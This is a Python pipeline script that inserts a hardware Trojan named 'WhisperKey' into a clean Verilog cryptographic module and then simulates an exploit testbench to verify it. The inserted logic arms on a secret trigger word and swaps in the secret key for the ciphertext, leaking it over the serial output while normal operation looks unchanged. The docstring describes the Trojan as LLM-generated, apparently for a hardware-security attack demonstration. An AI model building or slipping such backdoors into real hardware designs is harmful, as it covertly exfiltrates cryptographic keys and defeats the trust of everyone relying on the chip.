#!/usr/bin/env python3
"""
WhisperKey one-click pipeline:  generate -> insert -> simulate.

This is the automated insertion/test harness for the AI-generated Trojan.  It:
  1. reads the GOLDEN (clean) recovered RTL,
  2. inserts the WhisperKey Trojan programmatically (structural text insertion at
     named anchors - no hand editing of the trojaned file),
  3. compiles the golden + trojaned RTL with the exploit testbench (Icarus Verilog),
  4. runs the simulation and reports PASS/FAIL for the stealth + exploit checks.

In the full attack flow the Trojan Verilog in TROJAN_SNIPPET is produced by the
LLM (see ../ai/ for the transcripts); this script is the deterministic wrapper
that inserts it and proves it, so the end-to-end flow is reproducible with one
command:   python3 pipeline.py
"""
import os, re, subprocess, sys

HERE   = os.path.dirname(os.path.abspath(__file__))
RTL    = os.path.join(HERE, "..", "rtl")
TB     = os.path.join(HERE, "..", "tb")
GOLDEN = os.path.join(RTL, "les_crypto_golden.v")
OUT    = os.path.join(RTL, "les_crypto_trojan.v")

# --- the AI-generated Trojan, inserted into the golden RTL -------------------
TRIGGER = "32'h1337_C0DE"
TROJAN_SNIPPET = f"""
    // ======================================================================
    //  >>>>>>>>>>>>>>>>>>>>   WhisperKey Trojan (auto-inserted)   <<<<<<<<<<<<
    //  Trigger : loaded input word == secret TRIGGER.
    //  Payload : load KEY instead of the ciphertext -> leaks over MISO.
    //  Cost    : one flag + one 32-bit 2:1 mux.  Normal op stays bit-exact.
    // ======================================================================
    reg armed;
    always @(posedge SCK) begin
        if (!RST_N)                               armed <= 1'b0;
        else if (START && (data_word == TRIGGER)) armed <= 1'b1;
        else if (load_output)                     armed <= 1'b0;
    end
    wire [31:0] load_value = armed ? SECRET_KEY : result;
    // ======================================================================
"""

def insert_trojan(golden_text):
    s = golden_text
    # 1. rename module + add TRIGGER parameter
    s = s.replace("module les_crypto_golden #(",
                  "module les_crypto_trojan #(")
    s = re.sub(r"(parameter \[31:0\] SECRET_KEY = 32'h8E04_3CB1)",
               r"\1,\n    parameter [31:0] TRIGGER    = " + TRIGGER, s, count=1)
    # 2. route the shift-register parallel load through the Trojan mux
    s = s.replace("else if (load_output)  shift_reg <= result;",
                  "else if (load_output)  shift_reg <= load_value;  // [Trojan] mux")
    # 3. splice the Trojan logic in at the named declaration anchor, so load_value
    #    is declared before the shift-register load that uses it (strict ordering)
    s = s.replace("    // [TROJAN-ANCHOR]  (clean design: nothing inserted here)",
                  TROJAN_SNIPPET, 1)
    # 4. header note
    s = s.replace("(GOLDEN / clean reference, no Trojan)",
                  "(auto-generated trojaned RTL - see tools/pipeline.py)")
    return s

def run(cmd, cwd):
    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)

def main():
    print("[1/3] reading golden RTL  :", os.path.relpath(GOLDEN))
    golden = open(GOLDEN).read()

    print("[2/3] inserting WhisperKey Trojan -> ", os.path.relpath(OUT))
    trojaned = insert_trojan(golden)
    assert "les_crypto_trojan" in trojaned and "load_value" in trojaned, "insertion failed"
    open(OUT, "w").write(trojaned)

    print("[3/3] compiling + simulating exploit testbench ...\n")
    exe = os.path.join(RTL, "sim_pipeline")
    c = run(["iverilog", "-g2012", "-o", exe, GOLDEN, OUT,
             os.path.join(TB, "tb_exploit.v")], cwd=RTL)
    if c.returncode != 0:
        print("iverilog failed:\n", c.stderr); sys.exit(1)
    r = run(["vvp", exe], cwd=RTL)
    out = r.stdout
    print(out)
    ok = "ALL CHECKS PASSED" in out
    print("PIPELINE RESULT:", "SUCCESS - Trojan inserted, stealth + exploit verified"
          if ok else "FAILED")
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
